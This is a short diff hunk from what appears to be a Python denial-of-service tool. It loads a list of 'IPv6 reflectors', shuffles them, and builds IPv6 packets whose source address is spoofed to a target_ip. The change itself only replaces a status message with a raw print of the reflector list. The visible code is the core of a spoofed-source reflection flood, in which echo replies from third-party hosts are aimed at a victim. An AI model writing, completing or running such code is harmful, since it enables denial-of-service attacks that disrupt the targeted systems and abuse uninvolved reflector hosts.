@@ -84,8 +84,8 @@ if len(all_ips) == 0:
 
 server_ip = all_ips
 random.shuffle(server_ip)
-
-print(f"[+] Loaded {len(server_ip)} IPv6 reflectors from file (limit: {max_ips})")
+print(server_ip)
+#print(f"[+] Loaded {len(server_ip)} IPv6 reflectors from file (limit: {max_ips})")
 
 def build_packet(dst_ip, length, target_ip, pkt_type="ERQ"):
     ip = random.choice((IPv6(src=target_ip, dst=dst_ip, hlim=255),IPv6(src=dst_ip,dst=target_ip,hlim=255)))
